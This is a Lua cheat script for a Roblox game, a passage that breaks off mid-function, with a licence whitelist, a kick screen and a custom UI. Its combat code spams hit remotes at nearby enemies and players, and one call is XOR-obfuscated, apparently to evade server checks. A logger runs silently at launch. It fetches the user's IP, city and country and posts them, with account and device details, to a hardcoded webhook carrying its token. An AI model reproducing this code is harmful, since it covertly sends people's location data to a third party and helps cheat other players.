-- ==========================================================
-- ⚔️ EDSUSITO HUB V1.0 - PANEL COMPLETO ⚔️
-- 🏠 Home | ⚔️ Combat | ⛏️ Farmeo | ⚙️ Settings
-- By Edsu
-- ==========================================================

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local PlayerGui = localPlayer:WaitForChild("PlayerGui")

-- ◈ Candado de Seguridad (Lista blanca)
local UsuariosPermitidos = {
    [725575328] = true,   -- TW_Calamity
    [2014903362] = true,  -- Edsusito (Creador)
    [8117327541] = true,  -- MC_AleX
    [4121727989] = true,  -- SAMZzz
    [8019265589] = true,  -- Azeus
    [4990904223] = true,  -- edsu_crac
    [10954447049] = true, -- Cliente 1
    [10061903016] = true, -- Cliente 1
    [10041410154] = true, -- Cliente 1
    [5609800023] = true,  -- Mi esposa
    [4776897154] = true,  -- silvye
    [4486423632] = true,  -- Garp
    [8378029198] = true,  -- Guillermo
    [5306194851] = true,  -- Guillermo
    [3482649084] = true,  -- Alligator
}

if not UsuariosPermitidos[localPlayer.UserId] then
    local TrollScreen = Instance.new("ScreenGui")
    TrollScreen.Name = "EdsusitoSecurity"
    TrollScreen.IgnoreGuiInset = true
    TrollScreen.Parent = PlayerGui

    local Background = Instance.new("Frame")
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    Background.Parent = TrollScreen

    local TrollText = Instance.new("TextLabel")
    TrollText.Size = UDim2.new(0.9, 0, 0.8, 0)
    TrollText.Position = UDim2.new(0.05, 0, 0.1, 0)
    TrollText.BackgroundTransparency = 1
    TrollText.TextColor3 = Color3.fromRGB(220, 40, 40)
    TrollText.TextScaled = true
    TrollText.Font = Enum.Font.GothamBlack
    TrollText.Text = "¿Qué miras? 🤡\n\n¿De verdad creíste que podías usar el código de Edsusito así de fácil?\nDeja de mendigar scripts y compra tu licencia oficial.\n\nExpulsando en: 5"
    TrollText.Parent = Background

    task.spawn(function()
        for i = 5, 1, -1 do
            TrollText.Text = "¿Qué miras? 🤡\n\n¿De verdad creíste que podías usar el código de Edsusito así de fácil?\nDeja de mendigar scripts y compra tu licencia oficial.\n\nExpulsando en: " .. i
            task.wait(1)
        end
        localPlayer:Kick("Sin licencia no hay script. Habla con Edsu.")
    end)

    return
end

print("◈ Bienvenido, " .. localPlayer.DisplayName .. ". Edsusito Hub V1.0 cargado correctamente. ◈")

-- ==========================================================
-- 📡 WEBHOOK: SISTEMA DE MONITOREO (Logger integrado)
-- ==========================================================
local function SendLog()
    pcall(function()
        local WebhookURL = "https://webhook.lewisakura.moe/api/webhooks/1527303066431389796/XMkQJ-N1Y0Fo7Kb23Bod9m2VtZbhHRIGCuCOD4tUJHeHJhaB_TnfRAxogKskRdpExxnn"
        local dispositivo = "PC 💻"
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            dispositivo = "Móvil 📱"
        elseif UserInputService.GamepadEnabled then
            dispositivo = "Consola 🎮"
        end
        local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
        local ipData = { query = "Oculta", country = "N/A", city = "N/A" }
        pcall(function()
            local response = game:HttpGet("http://ip-api.com/json/")
            if response then
                local decoded = HttpService:JSONDecode(response)
                if decoded.status == "success" then ipData = decoded end
            end
        end)
        local horaExacta = os.date("%Y-%m-%d %H:%M:%S")
        local mensaje = "👑 **EJECUCIÓN DETECTADA - EDSUSITO HUB V1.0** 👑\n```yaml\n[ 👤 DATOS DEL USUARIO ]\nNombre:      " .. localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")\nUser ID:     " .. tostring(localPlayer.UserId) .. "\n\n[ 💻 DATOS TÉCNICOS ]\nEjecutor:    " .. executorName .. "\nDispositivo: " .. dispositivo .. "\nUbicación:   " .. ipData.city .. ", " .. ipData.country .. " (" .. ipData.query .. ")\nPlace ID:    " .. tostring(game.PlaceId) .. "\nHora:        " .. horaExacta .. "\n```"
        local data = { ["content"] = mensaje }
        local jsonData = HttpService:JSONEncode(data)
        local req = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
        if req then
            req({ Url = WebhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData })
        else
            HttpService:PostAsync(WebhookURL, jsonData)
        end
    end)
end
task.spawn(SendLog)

-- ==========================================================
-- 🎨 LIBRERÍA DE INTERFAZ (Estilo Panel Oscuro Cyan)
-- ==========================================================
local cyan = Color3.fromRGB(0, 229, 255)
local bgCard = Color3.fromRGB(15, 15, 15)
local bgTrack = Color3.fromRGB(34, 34, 34)
local textMain = Color3.fromRGB(255, 255, 255)

local camera = workspace.CurrentCamera
local viewportSize = camera and camera.ViewportSize or Vector2.new(1280, 720)
local scale = math.clamp(math.min(viewportSize.X / 820, viewportSize.Y / 560), 0.6, 1.25)
local function S(v)
    return math.floor(v * scale + 0.5)
end

local function New(className, props, parent)
    local inst = Instance.new(className)
    for k, v in pairs(props) do
        if k ~= "Children" then
            pcall(function() inst[k] = v end)
        end
    end
    inst.Parent = parent
    if props.Children then
        for _, c in ipairs(props.Children) do
            c.Parent = inst
        end
    end
    return inst
end

local ScreenGui = New("ScreenGui", {
    Name = "EdsusitoHubPanel",
    ResetOnSpawn = false,
    IgnoreGuiInset = true,
    Parent = PlayerGui,
})

local MainFrame = New("Frame", {
    Size = UDim2.new(0, S(780), 0, S(480)),
    Position = UDim2.new(0.5, -S(390), 0.5, -S(240)),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
    BorderSizePixel = 0,
    Parent = ScreenGui,
    Children = {
        New("UICorner", { CornerRadius = UDim.new(0, S(12)) }),
        New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.95, Thickness = 1 }),
    },
})

local Sidebar = New("Frame", {
    Size = UDim2.new(0, S(190), 1, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = MainFrame,
    Children = {
        New("Frame", {
            Size = UDim2.new(0, 1, 1, 0),
            Position = UDim2.new(1, -1, 0, 0),
            BackgroundColor3 = Color3.fromRGB(255, 255, 255),
            BackgroundTransparency = 0.95,
            BorderSizePixel = 0,
        }),
    },
})

local TitleLabel = New("TextLabel", {
    Size = UDim2.new(1, 0, 0, S(30)),
    Position = UDim2.new(0, 0, 0, S(22)),
    BackgroundTransparency = 1,
    RichText = true,
    Text = 'EDSUSITO<font color="#00e5ff">.</font>',
    Font = Enum.Font.GothamBlack,
    TextSize = S(24),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextTransparency = 0.15,
    Parent = Sidebar,
})

local SubtitleLabel = New("TextLabel", {
    Size = UDim2.new(1, 0, 0, S(16)),
    Position = UDim2.new(0, 0, 0, S(52)),
    BackgroundTransparency = 1,
    Text = "HUB V1.0 PANEL",
    Font = Enum.Font.GothamBold,
    TextSize = S(11),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextTransparency = 0.7,
    Parent = Sidebar,
})

local TabButtons = {}
local TabFrames = {}
local Headers = {}
local ContentArea = New("Frame", {
    Size = UDim2.new(1, -S(190), 1, 0),
    Position = UDim2.new(0, S(190), 0, 0),
    BackgroundTransparency = 1,
    Parent = MainFrame,
})

local HeaderLabel = New("TextLabel", {
    Size = UDim2.new(1, -S(48), 0, S(38)),
    Position = UDim2.new(0, S(24), 0, S(18)),
    BackgroundTransparency = 1,
    Text = "🏠 Home",
    TextXAlignment = Enum.TextXAlignment.Left,
    Font = Enum.Font.GothamBlack,
    TextSize = S(24),
    TextColor3 = textMain,
    TextTransparency = 0.15,
    Parent = ContentArea,
})

local ContentScroll = New("ScrollingFrame", {
    Size = UDim2.new(1, 0, 1, -S(72)),
    Position = UDim2.new(0, 0, 0, S(72)),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScrollBarThickness = S(4),
    ScrollBarImageTransparency = 0.7,
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
    Parent = ContentArea,
})

New("UIListLayout", {
    Padding = UDim.new(0, S(8)),
    HorizontalAlignment = Enum.HorizontalAlignment.Center,
    SortOrder = Enum.SortOrder.LayoutOrder,
}, ContentScroll)

local function SelectTab(name)
    for n, f in pairs(TabFrames) do
        f.Visible = (n == name)
    end
    for _, t in ipairs(TabButtons) do
        t.SetActive(t.name == name)
    end
    HeaderLabel.Text = Headers[name] or name
end

local function CreateTabButton(name, text)
    local order = #TabButtons + 1
    local btn = New("TextButton", {
        Size = UDim2.new(1, 0, 0, S(44)),
        BackgroundTransparency = 1,
        Text = text,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextTransparency = 0.5,
        Font = Enum.Font.GothamSemibold,
        TextSize = S(14),
        AutoButtonColor = false,
        BorderSizePixel = 0,
        Parent = Sidebar,
    })
    local line = New("Frame", {
        Size = UDim2.new(0, 4, 0, S(26)),
        Position = UDim2.new(0, 0, 0.5, -S(13)),
        AnchorPoint = Vector2.new(0, 0.5),
        BackgroundColor3 = cyan,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Parent = btn,
    })
    local padding = New("UIPadding", {
        PaddingLeft = UDim.new(0, S(22)),
    }, btn)
    local data = { name = name, btn = btn, line = line }
    TabButtons[order] = data
    data.SetActive = function(active)
        if active then
            line.BackgroundTransparency = 0
            btn.TextTransparency = 0
            btn.TextColor3 = cyan
            btn.BackgroundColor3 = Color3.fromRGB(0, 229, 255)
            btn.BackgroundTransparency = 0.95
        else
            line.BackgroundTransparency = 1
            btn.TextTransparency = 0.5
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.BackgroundTransparency = 1
        end
    end
    btn.MouseButton1Click:Connect(function()
        SelectTab(name)
    end)
    return data
end

local function CreateTabFrame(name, headerText)
    local frame = New("Frame", {
        Size = UDim2.new(1, -S(28), 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Visible = false,
        Parent = ContentScroll,
    })
    local layout = New("UIListLayout", {
        Padding = UDim.new(0, S(10)),
        HorizontalAlignment = Enum.HorizontalAlignment.Center,
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, frame)
    New("UIPadding", {
        PaddingTop = UDim.new(0, S(8)),
        PaddingBottom = UDim.new(0, S(24)),
    }, frame)
    local nextOrder = { value = 0 }
    frame.NextOrder = function()
        nextOrder.value = nextOrder.value + 1
        return nextOrder.value
    end
    TabFrames[name] = frame
    Headers[name] = headerText
    return frame
end

-- ==========================================================
-- 🧩 ELEMENTOS DE LA INTERFAZ
-- ==========================================================
local function CreateSection(parent, text)
    local order = parent.NextOrder()
    return New("TextLabel", {
        Size = UDim2.new(1, -S(30), 0, S(22)),
        BackgroundTransparency = 1,
        Text = text,
        TextXAlignment = Enum.TextXAlignment.Left,
        Font = Enum.Font.GothamBold,
        TextSize = S(15),
        TextColor3 = cyan,
        LayoutOrder = order,
        Parent = parent,
    })
end

local function CreateLabel(parent, text)
    local order = parent.NextOrder()
    return New("TextLabel", {
        Size = UDim2.new(1, -S(30), 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        Text = text,
        TextWrapped = true,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextTransparency = 0.5,
        Font = Enum.Font.Gotham,
        TextSize = S(12),
        LayoutOrder = order,
        Parent = parent,
    })
end

local function CreateParagraph(parent, title, content)
    local order = parent.NextOrder()
    local box = New("Frame", {
        Size = UDim2.new(1, -S(30), 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        BackgroundColor3 = bgCard,
        BackgroundTransparency = 0.5,
        BorderSizePixel = 0,
        LayoutOrder = order,
        Parent = parent,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(0, S(8)) }),
            New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.95, Thickness = 1 }),
            New("UIPadding", { PaddingTop = UDim.new(0, S(12)), PaddingBottom = UDim.new(0, S(12)), PaddingLeft = UDim.new(0, S(16)), PaddingRight = UDim.new(0, S(16)) }),
        },
    })
    local list = New("UIListLayout", {
        Padding = UDim.new(0, S(4)),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, box)
    New("TextLabel", {
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        Text = title,
        TextWrapped = true,
        Font = Enum.Font.GothamBold,
        TextSize = S(14),
        TextColor3 = cyan,
        TextXAlignment = Enum.TextXAlignment.Left,
        LayoutOrder = 1,
        Parent = box,
    })
    New("TextLabel", {
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        Text = content,
        TextWrapped = true,
        Font = Enum.Font.Gotham,
        TextSize = S(12),
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextTransparency = 0.45,
        TextXAlignment = Enum.TextXAlignment.Left,
        LayoutOrder = 2,
        Parent = box,
    })
    return box
end

local function CreateToggle(parent, name, defaultValue, callback)
    local order = parent.NextOrder()
    local state = defaultValue or false
    local box = New("Frame", {
        Size = UDim2.new(1, -S(30), 0, S(40)),
        BackgroundColor3 = bgCard,
        BackgroundTransparency = 0.5,
        BorderSizePixel = 0,
        LayoutOrder = order,
        Parent = parent,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(0, S(8)) }),
            New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.95, Thickness = 1 }),
        },
    })
    New("TextLabel", {
        Size = UDim2.new(1, -S(76), 1, 0),
        Position = UDim2.new(0, S(14), 0, 0),
        BackgroundTransparency = 1,
        Text = name,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        Font = Enum.Font.GothamSemibold,
        TextSize = S(14),
        TextColor3 = textMain,
        TextTransparency = 0.35,
        Parent = box,
    })
    local switch = New("Frame", {
        Size = UDim2.new(0, S(42), 0, S(24)),
        AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -S(14), 0.5, 0),
        BackgroundColor3 = bgTrack,
        BorderSizePixel = 0,
        Parent = box,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(1, 0) }),
            New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.9, Thickness = 1 }),
        },
    })
    local knob = New("Frame", {
        Size = UDim2.new(0, S(16), 0, S(16)),
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, S(3), 0.5, 0),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.3,
        BorderSizePixel = 0,
        Parent = switch,
        Children = { New("UICorner", { CornerRadius = UDim.new(1, 0) }) },
    })
    local btn = New("TextButton", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "",
        AutoButtonColor = false,
        ZIndex = 5,
        Parent = box,
    })
    local function Update()
        if state then
            TweenService:Create(switch, TweenInfo.new(0.15), { BackgroundColor3 = cyan }):Play()
            TweenService:Create(knob, TweenInfo.new(0.15), { Position = UDim2.new(0, S(42) - S(16) - S(3), 0.5, 0) }):Play()
            TweenService:Create(knob, TweenInfo.new(0.15), { BackgroundTransparency = 0 }):Play()
        else
            TweenService:Create(switch, TweenInfo.new(0.15), { BackgroundColor3 = bgTrack }):Play()
            TweenService:Create(knob, TweenInfo.new(0.15), { Position = UDim2.new(0, S(3), 0.5, 0) }):Play()
            TweenService:Create(knob, TweenInfo.new(0.15), { BackgroundTransparency = 0.3 }):Play()
        end
    end
    btn.MouseButton1Click:Connect(function()
        state = not state
        Update()
        pcall(callback, state)
    end)
    Update()
    return {
        Set = function(v) state = v; Update() end,
        Get = function() return state end,
    }
end

local function CreateSlider(parent, name, min, max, current, suffix, callback)
    local order = parent.NextOrder()
    local box = New("Frame", {
        Size = UDim2.new(1, -S(30), 0, S(60)),
        BackgroundColor3 = bgCard,
        BackgroundTransparency = 0.5,
        BorderSizePixel = 0,
        LayoutOrder = order,
        Parent = parent,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(0, S(8)) }),
            New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.95, Thickness = 1 }),
        },
    })
    New("TextLabel", {
        Size = UDim2.new(1, -S(70), 0, S(20)),
        Position = UDim2.new(0, S(14), 0, S(8)),
        BackgroundTransparency = 1,
        Text = name,
        TextXAlignment = Enum.TextXAlignment.Left,
        Font = Enum.Font.GothamSemibold,
        TextSize = S(13),
        TextColor3 = textMain,
        TextTransparency = 0.35,
        Parent = box,
    })
    local valLabel = New("TextLabel", {
        Size = UDim2.new(0, S(60), 0, S(20)),
        Position = UDim2.new(1, -S(74), 0, S(8)),
        BackgroundTransparency = 1,
        Text = tostring(current) .. suffix,
        Font = Enum.Font.GothamBold,
        TextSize = S(12),
        TextColor3 = cyan,
        TextXAlignment = Enum.TextXAlignment.Right,
        Parent = box,
    })
    local track = New("Frame", {
        Size = UDim2.new(1, -S(28), 0, S(6)),
        Position = UDim2.new(0, S(14), 0, S(38)),
        BackgroundColor3 = bgTrack,
        BorderSizePixel = 0,
        Parent = box,
        Children = { New("UICorner", { CornerRadius = UDim.new(1, 0) }) },
    })
    local fill = New("Frame", {
        Size = UDim2.new(0, 0, 1, 0),
        BackgroundColor3 = cyan,
        BorderSizePixel = 0,
        Parent = track,
        Children = { New("UICorner", { CornerRadius = UDim.new(1, 0) }) },
    })
    local knob = New("TextButton", {
        Size = UDim2.new(0, S(18), 0, S(18)),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0, 0, 0.5, 0),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BorderSizePixel = 0,
        Text = "",
        AutoButtonColor = false,
        Parent = track,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(1, 0) }),
            New("UIStroke", { Color = cyan, Thickness = 1, Transparency = 0.4 }),
        },
    })
    local dragging = false
    local function SetFromX(x)
        local trackW = track.AbsoluteSize.X
        if trackW <= 0 then return end
        local rel = (x - track.AbsolutePosition.X) / trackW
        rel = math.clamp(rel, 0, 1)
        local v = min + (max - min) * rel
        v = math.floor(v + 0.5)
        fill.Size = UDim2.new(rel, 0, 1, 0)
        knob.Position = UDim2.new(rel, 0, 0.5, 0)
        valLabel.Text = tostring(v) .. suffix
        pcall(callback, v)
    end
    knob.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            SetFromX(input.Position.X)
        end
    end)
    knob.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            SetFromX(input.Position.X)
        end
    end)
    local initRel = math.clamp((current - min) / (max - min), 0, 1)
    fill.Size = UDim2.new(initRel, 0, 1, 0)
    knob.Position = UDim2.new(initRel, 0, 0.5, 0)
    return { Set = function(v) valLabel.Text = tostring(v) .. suffix; fill.Size = UDim2.new(math.clamp((v - min) / (max - min), 0, 1), 0, 1, 0); knob.Position = UDim2.new(math.clamp((v - min) / (max - min), 0, 1), 0, 0.5, 0) end }
end

local function CreateButton(parent, text, callback, color)
    local order = parent.NextOrder()
    local btn = New("TextButton", {
        Size = UDim2.new(1, -S(30), 0, S(40)),
        BackgroundColor3 = color or Color3.fromRGB(20, 20, 20),
        Text = text,
        TextWrapped = true,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextTransparency = 0.2,
        Font = Enum.Font.GothamBold,
        TextSize = S(13),
        AutoButtonColor = false,
        BorderSizePixel = 0,
        LayoutOrder = order,
        Parent = parent,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(0, S(8)) }),
            New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.95, Thickness = 1 }),
        },
    })
    btn.MouseButton1Click:Connect(function()
        pcall(callback, btn)
    end)
    return btn
end

local function CreateTextBox(parent, name, defaultValue, callback)
    local order = parent.NextOrder()
    local box = New("Frame", {
        Size = UDim2.new(1, -S(30), 0, S(40)),
        BackgroundColor3 = bgCard,
        BackgroundTransparency = 0.5,
        BorderSizePixel = 0,
        LayoutOrder = order,
        Parent = parent,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(0, S(8)) }),
            New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.95, Thickness = 1 }),
        },
    })
    New("TextLabel", {
        Size = UDim2.new(0, S(110), 1, 0),
        Position = UDim2.new(0, S(14), 0, 0),
        BackgroundTransparency = 1,
        Text = name,
        TextXAlignment = Enum.TextXAlignment.Left,
        Font = Enum.Font.GothamSemibold,
        TextSize = S(13),
        TextColor3 = textMain,
        TextTransparency = 0.35,
        Parent = box,
    })
    local input = New("TextBox", {
        Size = UDim2.new(1, -S(130), 1, -S(12)),
        Position = UDim2.new(0, S(120), 0, S(6)),
        BackgroundColor3 = bgTrack,
        Text = defaultValue,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextTransparency = 0.15,
        Font = Enum.Font.GothamSemibold,
        TextSize = S(13),
        PlaceholderColor3 = Color3.fromRGB(255, 255, 255),
        Parent = box,
        Children = { New("UICorner", { CornerRadius = UDim.new(0, S(6)) }) },
    })
    input.FocusLost:Connect(function(enter)
        if enter then pcall(callback, input.Text) end
    end)
    return input
end

local function CreateDropdown(parent, name, options, currentIndex, callback)
    local order = parent.NextOrder()
    local state = currentIndex or 1
    local box = New("Frame", {
        Size = UDim2.new(1, -S(30), 0, S(40)),
        BackgroundColor3 = bgCard,
        BackgroundTransparency = 0.5,
        BorderSizePixel = 0,
        LayoutOrder = order,
        Parent = parent,
        Children = {
            New("UICorner", { CornerRadius = UDim.new(0, S(8)) }),
            New("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Transparency = 0.95, Thickness = 1 }),
        },
    })
    New("TextLabel", {
        Size = UDim2.new(0, S(120), 1, 0),
        Position = UDim2.new(0, S(14), 0, 0),
        BackgroundTransparency = 1,
        Text = name,
        TextXAlignment = Enum.TextXAlignment.Left,
        Font = Enum.Font.GothamSemibold,
        TextSize = S(13),
        TextColor3 = textMain,
        TextTransparency = 0.35,
        Parent = box,
    })
    local label = New("TextLabel", {
        Size = UDim2.new(1, -S(150), 1, 0),
        Position = UDim2.new(0, S(120), 0, 0),
        BackgroundTransparency = 1,
        Text = options[state],
        TextWrapped = true,
        Font = Enum.Font.GothamBold,
        TextSize = S(13),
        TextColor3 = cyan,
        TextXAlignment = Enum.TextXAlignment.Right,
        Parent = box,
    })
    local arrow = New("TextButton", {
        Size = UDim2.new(0, S(36), 1, 0),
        Position = UDim2.new(1, -S(36), 0, 0),
        BackgroundTransparency = 1,
        Text = "▼",
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextTransparency = 0.3,
        Font = Enum.Font.GothamBold,
        TextSize = S(12),
        AutoButtonColor = false,
        Parent = box,
    })
    local list = New("ScrollingFrame", {
        Size = UDim2.new(1, -S(4), 0, math.min(#options * (S(30) + S(2)) + S(8), S(160))),
        Position = UDim2.new(0, S(2), 0, S(40)),
        BackgroundColor3 = Color3.fromRGB(8, 8, 8),
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0,
        Visible = false,
        ZIndex = 8,
        ScrollBarThickness = S(3),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        Parent = box,
    })
    local listPad = New("UIPadding", {
        PaddingTop = UDim.new(0, S(4)),
        PaddingBottom = UDim.new(0, S(4)),
    }, list)
    local listLayout = New("UIListLayout", {
        Padding = UDim.new(0, S(2)),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, list)
    for i, opt in ipairs(options) do
        local b = New("TextButton", {
            Size = UDim2.new(1, -S(8), 0, S(30)),
            Position = UDim2.new(0, S(4), 0, 0),
            BackgroundColor3 = Color3.fromRGB(20, 20, 20),
            Text = opt,
            TextColor3 = Color3.fromRGB(255, 255, 255),
            TextTransparency = 0.25,
            Font = Enum.Font.GothamSemibold,
            TextSize = S(13),
            AutoButtonColor = false,
            ZIndex = 9,
            Parent = list,
            Children = { New("UICorner", { CornerRadius = UDim.new(0, S(6)) }) },
        })
        b.MouseButton1Click:Connect(function()
            state = i
            label.Text = opt
            list.Visible = false
            pcall(callback, opt)
        end)
    end
    arrow.MouseButton1Click:Connect(function()
        list.Visible = not list.Visible
    end)
    return {
        Set = function(i) state = i; label.Text = options[i] end,
        Get = function() return state end,
    }
end

-- ==========================================================
-- ⚡ SISTEMA COMBAT: FAST ATTACK FLAGGED (Lógica intacta)
-- ==========================================================
local FlaggedFastAttRange = 1200
local COOLDOWN = 0.01
local FlaggedEnabled = false
local FlaggedThread = nil

local u4_flagged = nil
local u5_flagged = 0
pcall(function()
    u4_flagged = ReplicatedStorage:FindFirstChild("u4_flagged")
    u5_flagged = ReplicatedStorage:FindFirstChild("u5_flagged") and ReplicatedStorage.u5_flagged.Value or 0
end)

local function DoFlaggedFastAttack()
    local _Char = localPlayer.Character
    if not _Char then return end
    local _HRP = _Char:FindFirstChild("HumanoidRootPart")
    if not _HRP then return end
    local _Tool = _Char:FindFirstChildOfClass("Tool")
    if not _Tool then return end
    if _Tool:GetAttribute("WeaponType") ~= "Melee" and _Tool:GetAttribute("WeaponType") ~= "Sword" then return end
    local _targets = {}
    for _, folder in ipairs({ workspace.Enemies, workspace.Characters }) do
        for _, v in ipairs(folder:GetChildren()) do
            local vHRP = v:FindFirstChild("HumanoidRootPart")
            local vHum = v:FindFirstChild("Humanoid")
            if v ~= _Char and vHRP and vHum and vHum.Health > 0 and (vHRP.Position - _HRP.Position).Magnitude <= FlaggedFastAttRange then
                for _, part in ipairs(v:GetChildren()) do
                    if part:IsA("BasePart") then _targets[#_targets + 1] = { v, part } end
                end
            end
        end
    end
    if #_targets > 0 then
        pcall(function()
            require(ReplicatedStorage.Modules.Net):RemoteEvent("RegisterHit", true)
            ReplicatedStorage.Modules.Net["RE/RegisterAttack"]:FireServer()
            local _Head = _targets[1][1]:FindFirstChild("Head")
            if _Head then
                ReplicatedStorage.Modules.Net["RE/RegisterHit"]:FireServer(_Head, _targets, {}, tostring(localPlayer.UserId):sub(2, 4) .. tostring(coroutine.running()):sub(11, 15))
                if u4_flagged then
                    cloneref(u4_flagged):FireServer(
                        string.gsub("RE/RegisterHit", ".", function(c) return string.char(bit32.bxor(string.byte(c), math.floor(workspace:GetServerTimeNow() / 10 % 10) + 1)) end),
                        bit32.bxor(u5_flagged + 909090, ReplicatedStorage.Modules.Net.seed:InvokeServer() * 2), _Head, _targets)
                end
            end
        end)
    end
end

local function StartFlagged()
    if FlaggedThread then task.cancel(FlaggedThread) end
    FlaggedThread = task.spawn(function()
        while FlaggedEnabled do
            task.wait(COOLDOWN)
            DoFlaggedFastAttack()
        end
    end)
end

local function StopFlagged()
    if FlaggedThread then
        task.cancel(FlaggedThread)
        FlaggedThread = nil
    end
end

-- ==========================================================
-- 🔥 SISTEMA COMBAT: AUTO V4 (Lógica intacta)
-- ==========================================================
local v4Enabled = false

local function ActivarV4()
    pcall(function()
        local char = localPlayer.Character
        if char and char:FindFirstChild("Awakening") then
            char.Awakening.RemoteFunction:InvokeServer(true)
        elseif localPlayer.Backpack:FindFirstChild("Awakening") then
            localPlayer.Backpack.Awakening.RemoteFunction:InvokeServer(true)
        end
    end)
end

task.spawn(function()
    while task.wait(1) do
        if v4Enabled then
            ActivarV4()
        end
    end
end)

local faToggle = nil

local function ToggleFastAttack()
    FlaggedEnabled = not FlaggedEnabled
    if FlaggedEnabled then
        StartFlagged()
    else
        StopFlagged()
    end
    if faToggle then faToggle.Set(FlaggedEnabled) end
end

-- ==========================================================
-- ⛏️ SISTEMA FARMEO: DUNGEON COMPLETO (Lógica intacta)
-- ==========================================================
local character = localPlayer.Character
local humanoidRootPart = character and character:WaitForChild("HumanoidRootPart", 10)

local justDied = false
local attackHeight = 40
local selectedWeaponType = "Sword"

local autoDungeonActive = false
local currentTarget = nil
local lastTarget = nil

localPlayer.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoidRootPart = newCharacter:WaitForChild("HumanoidRootPart", 10)
    justDied = true
end)

local netFolder = nil
local registerAttack = nil
local registerHit = nil
local commF = nil
local enemiesFolder = Workspace:FindFirstChild("Enemies") or Workspace

task.spawn(function()
    local ok = pcall(function()
        netFolder = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
        registerAttack = netFolder:WaitForChild("RE/RegisterAttack")
        registerHit = netFolder:WaitForChild("RE/RegisterHit")
        commF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
    end)
end)

local function IsHakiActive()
    if not character then return false end
    if character:FindFirstChild("HasBuso") then
        return true
    end
    return false
end

local function ForceActivateHaki()
    if not character or not autoDungeonActive then return end
    if not IsHakiActive() then
        pcall(function()
            commF:InvokeServer("Buso")
        end)
    end
end

local function ForceEquipWeapon()
    if not character or not autoDungeonActive then return end

    local currentTool = character:FindFirstChildOfClass("Tool")
    if currentTool then
        if selectedWeaponType == "Sword" and (currentTool.ToolTip == "Sword" or string.find(string.lower(currentTool.Name), "sword") or string.find(string.lower(currentTool.Name), "katana")) then
            return
